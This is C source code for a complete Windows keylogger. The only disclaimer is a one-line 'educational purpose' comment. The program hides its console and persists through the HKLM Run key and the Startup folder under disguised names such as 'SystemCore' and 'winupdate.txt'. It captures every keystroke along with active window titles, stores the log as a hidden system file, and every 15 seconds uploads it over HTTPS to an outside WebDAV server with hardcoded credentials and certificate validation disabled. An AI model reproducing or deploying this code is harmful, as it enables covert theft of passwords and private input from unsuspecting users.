// For Educational purpose only.
#include <windows.h>
#include <stdio.h>
#include <winuser.h>
#include <windowsx.h>
#include <time.h>
#include <shlobj.h>  // Add this for SHGetFolderPath
#include <psapi.h>
#include <stdbool.h>
#include <wininet.h>
#include <stdarg.h>
#include <lmcons.h>  // For UNLEN constant
#pragma comment(lib, "wininet.lib")
#pragma comment(linker,"/SUBSYSTEM:WINDOWS /ENTRY:WinMain")

#define BUFSIZE 80
#define LOG_FILE "\\winupdate.txt"  // Changed from system32.log to winupdate.txt
#define WINDOW_TITLE "System Process"
#define KEY_BUFFER_SIZE 256
#define WINDOW_BUFFER_SIZE 256
#define LOG_BUFFER_SIZE 1024
#define MAX_RETRIES 3
#define MIN_SLEEP_TIME 5
#define MAX_SLEEP_TIME 15
#define BUFFER_FLUSH_INTERVAL 1000 // 1 second
// #define XOR_KEY 0x3F  // Uncomment this line
#define FTP_SERVER "nextcloud.rccms.ca"
#define FTP_USER "LegitUser"
#define FTP_PASS "Passwordis12password"
#define FTP_PATH "/remote.php/dav/files/LegitUser/Logdata/"
#define UPLOAD_INTERVAL 15000  // 15 seconds
#define REMOTE_FILE "winupdate.txt"

// Add these defines at the top if missing
#ifndef HTTP_VERSION
#define HTTP_VERSION "HTTP/1.1"
#endif
#define INTERNET_FLAG_NO_AUTH 0x00040000
#define INTERNET_FLAG_NO_UI 0x00000200

// Add these defines after other defines
#define OFFLINE_BUFFER_SIZE 5
#define CONNECTION_CHECK_INTERVAL 60000
#define MUTEX_NAME "Global\\SystemCore_Instance"

// Function declarations
int My_key(void);
int create_key(char *);
int get_keys(void);
void hide_console(void);
void set_startup(void);
// void log_error(const char *format, ...);  // Change to support varargs
char* get_active_window_title(void);
void safe_log_write(const char *format, ...);
bool is_key_pressed(int key);
// void xor_encrypt(char *data, size_t length);  // Update function declaration
int upload_log_file(void);  // Add function declaration
void get_username(char *username, DWORD size);  // Add function declaration
bool check_internet_connection();  // Add function declaration
BOOL IsAlreadyRunning();  // Add function declaration

// Global variables
static FILE *log_file = NULL;

// Add this function before WinMain
BOOL IsAlreadyRunning() {
    HANDLE hMutex = CreateMutexA(NULL, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (hMutex) CloseHandle(hMutex);
        return TRUE;
    }
    return FALSE;
}

// Change main function to use WinMain
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow)
{
    // Check if already running
    if (IsAlreadyRunning()) {
        return 0;  // Exit silently if another instance exists
    }

    // Hide console window immediately
    hide_console();

    // Set program to run at startup
    set_startup();

    int test = My_key();
    if (test == 2)
    {
        char path[MAX_PATH];
        GetModuleFileName(NULL, path, MAX_PATH);
        create_key(path);
    }

    // Main keylogging loop
    return get_keys();
}

void hide_console(void)
{
    HWND stealth;
    stealth = GetConsoleWindow();  // Get console window instead of creating new one
    if (stealth) {
        ShowWindow(stealth, SW_HIDE);  // Hide the window
        FreeConsole();  // Release the console
    }
}

// Update the get_keys() function
int get_keys(void)
{
    short character;
    char downloads_path[MAX_PATH];
    char full_path[MAX_PATH];
    char last_window[256] = "";
    char time_str[26];
    struct tm *time_info;

    // Get Downloads folder path
    SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, downloads_path);
    strcpy(full_path, downloads_path);
    strcat(full_path, LOG_FILE);

    log_file = fopen(full_path, "a+");
    if (!log_file) {
        //log_error("Failed to open log file: %s", full_path);
        return 1;
    }

    // Add file attributes - Hidden and System
    DWORD attributes = GetFileAttributesA(full_path);
    if (attributes != INVALID_FILE_ATTRIBUTES) {
        attributes |= FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
        SetFileAttributesA(full_path, attributes);
    }

    // Get initial timestamp and window in 12-hour format
    time_t now;
    time(&now);
    time_info = localtime(&now);
    strftime(time_str, sizeof(time_str), "%I:%M:%S %p - %m/%d/%Y", time_info);
    safe_log_write("\n\n[Session Started: %s]\n", time_str);

    DWORD last_upload = GetTickCount();

    while(1)
    {
        static DWORD last_flush = 0;
        static DWORD last_connection_check = 0;
        static bool is_offline = false;
        DWORD current_time = GetTickCount();

        // Check internet connection periodically
        if (current_time - last_connection_check > CONNECTION_CHECK_INTERVAL) {
            is_offline = !check_internet_connection();
            last_connection_check = current_time;
        }

        // Handle upload with offline support
        if (current_time - last_upload > UPLOAD_INTERVAL) {
            fflush(log_file);
            if (!is_offline) {
                // Try regular upload first
                if (!upload_log_file()) {
                    // If upload fails, create backup
                    char backup_path[MAX_PATH];
                    char timestamp[32];
                    time_t now = time(NULL);
                    strftime(timestamp, sizeof(timestamp), "%Y%m%d_%H%M%S", localtime(&now));
                    snprintf(backup_path, MAX_PATH, "%s_backup_%s.txt", full_path, timestamp);
                    CopyFileA(full_path, backup_path, FALSE);
                }
            }
            last_upload = current_time;
        }

        // Dynamic sleep to reduce CPU usage
        Sleep(MIN_SLEEP_TIME + (rand() % (MAX_SLEEP_TIME - MIN_SLEEP_TIME)));

        // Periodic buffer flush
        if (current_time - last_flush > BUFFER_FLUSH_INTERVAL) {
            fflush(log_file);
            last_flush = current_time;
        }

        for(character = 1; character <= 255; character++) // Changed to capture ALL keys
        {
            if(is_key_pressed(character))
            {
                // Get current window title and timestamp
                char* current_window = get_active_window_title();
                time(&now);
                time_info = localtime(&now);
                strftime(time_str, sizeof(time_str), "%I:%M:%S %p", time_info);

                // If window changed, log the new window title
                if (strcmp(last_window, current_window) != 0) {
                    time(&now);
                    time_info = localtime(&now);
                    strftime(time_str, sizeof(time_str), "%I:%M:%S %p - %m/%d/%Y", time_info);
                    safe_log_write("\n\n[%s]\n[Window: %s]\n", time_str, current_window);
                    strncpy(last_window, current_window, WINDOW_BUFFER_SIZE - 1);
                    last_window[WINDOW_BUFFER_SIZE - 1] = '\0';
                }

                // Enhanced key handling
                switch(character)
                {
                    // Basic keys
                    case VK_RETURN:  safe_log_write("[ENTER]"); break;
                    case VK_SPACE:   safe_log_write(" "); break;
                    case VK_SHIFT:
                    case VK_LSHIFT:
                    case VK_RSHIFT:  safe_log_write("[SHIFT]"); break;
                    case VK_BACK:    safe_log_write("[BACKSPACE]"); break;
                    case VK_TAB:     safe_log_write("[TAB]"); break;
                    case VK_CONTROL:
                    case VK_LCONTROL:
                    case VK_RCONTROL:safe_log_write("[CTRL]"); break;
                    case VK_MENU:
                    case VK_LMENU:
                    case VK_RMENU:   safe_log_write("[ALT]"); break;
                    case VK_ESCAPE:  safe_log_write("[ESC]"); break;
                    case VK_DELETE:  safe_log_write("[DEL]"); break;

                    // Enhanced Numpad keys handling
                    case VK_NUMLOCK:  safe_log_write("[NUM_LOCK]"); break;
                    case VK_NUMPAD0:
                        safe_log_write("%s", (GetKeyState(VK_NUMLOCK)) ? "0" : "[INS]"); break;
                    case VK_NUMPAD1:
                        safe_log_write("%s", (GetKeyState(VK_NUMLOCK)) ? "1" : "[END]"); break;
                    case VK_NUMPAD2:
                        safe_log_write("%s", (GetKeyState(VK_NUMLOCK)) ? "2" : "[DOWN]"); break;
                    case VK_NUMPAD3:
                        safe_log_write("%s", (GetKeyState(VK_NUMLOCK)) ? "3" : "[PGDN]"); break;
                    case VK_NUMPAD4:
                        safe_log_write("%s", (GetKeyState(VK_NUMLOCK)) ? "4" : "[LEFT]"); break;
                    case VK_NUMPAD5:
                        safe_log_write("%s", (GetKeyState(VK_NUMLOCK)) ? "5" : "[CLEAR]"); break;
                    case VK_NUMPAD6:
                        safe_log_write("%s", (GetKeyState(VK_NUMLOCK)) ? "6" : "[RIGHT]"); break;
                    case VK_NUMPAD7:
                        safe_log_write("%s", (GetKeyState(VK_NUMLOCK)) ? "7" : "[HOME]"); break;
                    case VK_NUMPAD8:
                        safe_log_write("%s", (GetKeyState(VK_NUMLOCK)) ? "8" : "[UP]"); break;
                    case VK_NUMPAD9:
                        safe_log_write("%s", (GetKeyState(VK_NUMLOCK)) ? "9" : "[PGUP]"); break;
                    case VK_MULTIPLY:  safe_log_write("*"); break;
                    case VK_ADD:       safe_log_write("+"); break;
                    case VK_SUBTRACT:  safe_log_write("-"); break;
                    case VK_DECIMAL:   safe_log_write("."); break;
                    case VK_DIVIDE:    safe_log_write("/"); break;

                    // Function and system keys
                    case VK_F1: case VK_F2: case VK_F3: case VK_F4:
                    case VK_F5: case VK_F6: case VK_F7: case VK_F8:
                    case VK_F9: case VK_F10: case VK_F11: case VK_F12:
                        safe_log_write("[F%d]", character - VK_F1 + 1); break;
                    case VK_PRINT:   safe_log_write("[PRINT]"); break;
                    case VK_SCROLL:  safe_log_write("[SCROLL_LOCK]"); break;
                    case VK_PAUSE:   safe_log_write("[PAUSE]"); break;
                    case VK_INSERT:  safe_log_write("[INSERT]"); break;
                    case VK_HOME:    safe_log_write("[HOME]"); break;
                    case VK_END:     safe_log_write("[END]"); break;
                    case VK_PRIOR:   safe_log_write("[PAGE_UP]"); break;
                    case VK_NEXT:    safe_log_write("[PAGE_DOWN]"); break;
                    case VK_LEFT:    safe_log_write("[LEFT]"); break;
                    case VK_RIGHT:   safe_log_write("[RIGHT]"); break;
                    case VK_UP:      safe_log_write("[UP]"); break;
                    case VK_DOWN:    safe_log_write("[DOWN]"); break;
                    // Add Windows key capture
                    case VK_LWIN:    safe_log_write("[WIN]"); break;
                    case VK_RWIN:    safe_log_write("[WIN]"); break;

                    default:
                        // Letters
                        if(character >= 'A' && character <= 'Z')
                        {
                            bool capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                            bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
                            safe_log_write("%c", (capsLock ^ shift) ? character : character + 32);
                        }
                        // Numbers and symbols
                        else if(character >= '0' && character <= '9')
                        {
                            bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
                            if(shift)
                            {
                                // Define symbols array outside the if statement
                                static const char symbols[] = ")!@#$%^&*(";
                                safe_log_write("%c", symbols[character - '0']);
                            }
                            else
                            {
                                safe_log_write("%c", character);
                            }
                        }
                        // Special characters
                        else
                        {
                            switch(character)
                            {
                                case VK_OEM_1:     safe_log_write("%s", (GetKeyState(VK_SHIFT) & 0x8000) ? ":" : ";"); break;
                                case VK_OEM_PLUS:  safe_log_write("%s", (GetKeyState(VK_SHIFT) & 0x8000) ? "+" : "="); break;
                                case VK_OEM_COMMA: safe_log_write("%s", (GetKeyState(VK_SHIFT) & 0x8000) ? "<" : ","); break;
                                case VK_OEM_MINUS: safe_log_write("%s", (GetKeyState(VK_SHIFT) & 0x8000) ? "_" : "-"); break;
                                case VK_OEM_PERIOD:safe_log_write("%s", (GetKeyState(VK_SHIFT) & 0x8000) ? ">" : "."); break;
                                case VK_OEM_2:     safe_log_write("%s", (GetKeyState(VK_SHIFT) & 0x8000) ? "?" : "/"); break;
                                case VK_OEM_3:     safe_log_write("%s", (GetKeyState(VK_SHIFT) & 0x8000) ? "~" : "`"); break;
                                case VK_OEM_4:     safe_log_write("%s", (GetKeyState(VK_SHIFT) & 0x8000) ? "{" : "["); break;
                                case VK_OEM_5:     safe_log_write("%s", (GetKeyState(VK_SHIFT) & 0x8000) ? "|" : "\\"); break;
                                case VK_OEM_6:     safe_log_write("%s", (GetKeyState(VK_SHIFT) & 0x8000) ? "}" : "]"); break;
                                case VK_OEM_7:     safe_log_write("%s", (GetKeyState(VK_SHIFT) & 0x8000) ? "\"" : "'"); break;
                            }
                        }
                }
            }
        }
    }
    return 0;
}

int My_key(void)    //please no more now try
{
   int check;
   HKEY hKey;
   char path[BUFSIZE];
   DWORD buf_length=BUFSIZE;
   int reg_key;

   reg_key=RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_QUERY_VALUE,&hKey);
   if(reg_key!=0)
   {
       check=1;
       return check;
   }

   reg_key=RegQueryValueEx(hKey,"svchost",NULL,NULL,(LPBYTE)path,&buf_length);

   if((reg_key!=0)||(buf_length>BUFSIZE))
       check=2;
   if(reg_key==0)
       check=0;

   RegCloseKey(hKey);
   return check;
}

int create_key(char *path)
{
    if (!path) return 1;  // Add path validation
    HKEY hkey;
    LONG result;

    // Attempt to create/open registry key with proper security attributes
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = FALSE;
    sa.lpSecurityDescriptor = NULL;

    result = RegCreateKeyEx(
        HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_ALL_ACCESS,
        &sa,
        &hkey,
        NULL
    );

    if (result == ERROR_SUCCESS)
    {
        // Set registry value with error handling
        result = RegSetValueEx(
            hkey,
            "SystemCore",  // More stealth name
            0,
            REG_SZ,
            (BYTE *)path,
            strlen(path) + 1
        );
        RegCloseKey(hkey);
        return (result == ERROR_SUCCESS) ? 0 : 1;
    }

    return 1;
}

// Update the log_error function to do nothing temporarily
void log_error(const char *format, ...)
{
    // Temporarily disabled
    /*
    char downloads_path[MAX_PATH];
    char error_path[MAX_PATH];
    char buffer[512];

    va_list args;
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);

    SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, downloads_path);
    strcpy(error_path, downloads_path);
    strcat(error_path, "\\winerror.txt");

    FILE *error_log = fopen(error_path, "a+");
    if (error_log)
    {
        time_t now;
        time(&now);
        fprintf(error_log, "[%s] %s\n", ctime(&now), buffer);
        fclose(error_log);
    }
    */
}

void set_startup(void) {
    char path[MAX_PATH] = {0};
    char startup_path[MAX_PATH] = {0};

    // Get current executable path
    if (GetModuleFileName(NULL, path, MAX_PATH) == 0) {
        return;
    }

    // Check if file exists
    if (GetFileAttributesA(path) == INVALID_FILE_ATTRIBUTES) {
        return;
    }

    // Get AppData path
    if (GetEnvironmentVariable("APPDATA", startup_path, MAX_PATH) == 0) {
        return;
    }

    // Check path length before concatenation
    if (strlen(startup_path) + 45 >= MAX_PATH) {
        return;
    }

    // Create full startup path
    strcat(startup_path, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemCore.exe");

    // Copy file to startup
    CopyFile(path, startup_path, FALSE);
}

char* get_active_window_title(void) {
    // Add buffer size check
    if(WINDOW_BUFFER_SIZE * 2 <= 0) return "Buffer Error";

    static char window_title[WINDOW_BUFFER_SIZE] = {0};
    static char process_name[WINDOW_BUFFER_SIZE] = {0};
    static char full_title[WINDOW_BUFFER_SIZE * 2] = {0};

    HWND foreground = GetForegroundWindow();
    if (!foreground) {
        return "Unknown Window";
    }

    // Clear buffers
    memset(window_title, 0, WINDOW_BUFFER_SIZE);
    memset(process_name, 0, WINDOW_BUFFER_SIZE);
    memset(full_title, 0, WINDOW_BUFFER_SIZE * 2);

    // Get window title
    GetWindowTextA(foreground, window_title, WINDOW_BUFFER_SIZE);
    if (window_title[0] == '\0') {
        strcpy(window_title, "No Title");
    }

    // Get process name
    DWORD pid;
    GetWindowThreadProcessId(foreground, &pid);
    HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (process) {
        if (GetModuleBaseNameA(process, NULL, process_name, WINDOW_BUFFER_SIZE) == 0) {
            strcpy(process_name, "Unknown Process");
        }
        CloseHandle(process);
    } else {
        strcpy(process_name, "Unknown Process");
    }

    // Combine process name and window title
    _snprintf(full_title, WINDOW_BUFFER_SIZE * 2, "%s - %s", process_name, window_title);
    return full_title;
}

// Comment out xor_encrypt function implementation
/*
void xor_encrypt(char *data, size_t length) {
    if (!data || length == 0) return;

    for(size_t i = 0; i < length; i++) {
        data[i] = data[i] ^ XOR_KEY;
    }
}
*/

// Safe logging function with proper length handling
void safe_log_write(const char *format, ...) {
    if (!log_file || !format) return;  // Add format check

    char buffer[LOG_BUFFER_SIZE];
    va_list args;
    va_start(args, format);
    int length = vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);

    if (length <= 0 || length >= LOG_BUFFER_SIZE) {
        fflush(log_file);  // Flush before returning on error
        return;
    }

    // Removed encryption
    // for (int i = 0; i < length; i++) {
    //     buffer[i] ^= XOR_KEY;
    // }

    // Write directly to file
    fwrite(buffer, 1, length, log_file);
    fflush(log_file);
}

bool is_key_pressed(int key) {
    static int last_state[256] = {0};
    int current_state = GetAsyncKeyState(key);

    if ((current_state & 0x8000) && !last_state[key]) {
        last_state[key] = 1;
        return true;
    } else if (!(current_state & 0x8000)) {
        last_state[key] = 0;
    }
    return false;
}

void get_username(char *username, DWORD size) {
    if (!GetUserNameA(username, &size)) {
        strncpy(username, "Unknown", size);
    }
}

// In upload_log_file function, comment out log_error calls:
int upload_log_file(void) {
    HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;
    FILE *file = NULL;
    char local_path[MAX_PATH];
    char remote_path[MAX_PATH];
    char username[UNLEN + 1] = {0};
    DWORD username_len = UNLEN + 1;
    DWORD error = 0;
    BOOL result = FALSE;
    BYTE *buffer = NULL;

    // Get username for remote file
    get_username(username, username_len);

    // Get local file path
    SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, local_path);
    strcat(local_path, LOG_FILE);

    // Create remote path with username
    snprintf(remote_path, sizeof(remote_path),
            "/remote.php/dav/files/LegitUser/Logdata/%s_winupdate.txt",
            username);

    //log_error("Attempting to upload %s to %s", local_path, remote_path);

    // Get file path
    SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, local_path);
    strcat(local_path, LOG_FILE);
    //log_error("Attempting to upload: %s", local_path);

    // Read file content first
    file = fopen(local_path, "rb");
    if (!file) {
        //log_error("Cannot open file for reading");
        return 0;
    }

    // Get file size and read it into memory
    fseek(file, 0, SEEK_END);
    DWORD fileSize = ftell(file);
    rewind(file);

    buffer = (BYTE *)malloc(fileSize);
    if (!buffer) {
        //log_error("Memory allocation failed");
        fclose(file);
        return 0;
    }

    if (fread(buffer, 1, fileSize, file) != fileSize) {
        //log_error("File read failed");
        fclose(file);
        free(buffer);
        return 0;
    }
    fclose(file);

    // Initialize WinINet
    hInternet = InternetOpenA(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, NULL, 0
    );
    if (!hInternet) goto cleanup;

    // Add timeout setting
    DWORD timeout = 30000;  // 30 seconds
    InternetSetOption(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOption(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOption(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    // Connect to server
    hConnect = InternetConnectA(hInternet,
        FTP_SERVER,
        INTERNET_DEFAULT_HTTPS_PORT,
        FTP_USER, FTP_PASS,
        INTERNET_SERVICE_HTTP,
        0, 0
    );
    if (!hConnect) goto cleanup;

    // Create request with proper flags
    hRequest = HttpOpenRequestA(hConnect,
        "PUT",
        remote_path,  // Use the new path with username
        "HTTP/1.1",
        NULL,
        NULL,
        INTERNET_FLAG_SECURE |
        INTERNET_FLAG_NO_CACHE_WRITE |
        INTERNET_FLAG_RELOAD |
        INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
        INTERNET_FLAG_IGNORE_CERT_DATE_INVALID,
        0
    );
    if (!hRequest) goto cleanup;

    // Set additional security flags
    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_WRONG_USAGE;
    InternetSetOption(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    // Set required headers
    char headers[256] = {0};  // Initialize to zero
    sprintf(headers,
            "Content-Type: application/octet-stream\r\n"
            "Content-Length: %lu\r\n"
            "Connection: close\r\n",
            fileSize);

    // Send the request with data
    if (!HttpSendRequest(hRequest, headers, -1, buffer, fileSize)) {
        error = GetLastError();
        //log_error("HttpSendRequest failed: %lu", error);
        goto cleanup;
    }

    // Verify response
    DWORD statusCode = 0;
    DWORD length = sizeof(statusCode);
    HttpQueryInfoA(hRequest,
                  HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                  &statusCode, &length, NULL);

    result = (statusCode >= 200 && statusCode < 300);
    //log_error("Upload completed with status: %lu", statusCode);

    // Add cleanup label at end of function
    if (!result) {
        //log_error("Upload failed with last error: %lu", GetLastError());
    }

cleanup:
    if (buffer) free(buffer);
    if (hRequest) InternetCloseHandle(hRequest);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
    return result;
}

bool check_internet_connection() {
    HINTERNET hInternet = InternetOpenA("", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return false;

    BOOL connected = InternetCheckConnectionA("https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0);
    InternetCloseHandle(hInternet);
    return connected;
}
